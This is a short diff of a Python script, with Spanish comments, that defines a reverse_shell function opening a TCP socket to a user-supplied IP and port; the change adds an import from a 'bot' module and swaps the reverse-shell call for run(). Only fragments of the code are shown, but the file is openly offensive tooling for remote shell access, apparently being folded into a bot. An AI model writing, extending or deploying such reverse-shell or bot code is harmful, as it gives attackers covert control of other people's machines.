@@ -1,5 +1,7 @@
 import socket
 
+from bot import run
+
 def reverse_shell(ip, port):
     # Crear un socket TCP
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -32,4 +34,4 @@ if __name__ == "__main__":
     port = int(input("Introduzca el puerto: "))
 
     # Ejecutar la función de shell inverso
-    reverse_shell(ip, port)
+    run()
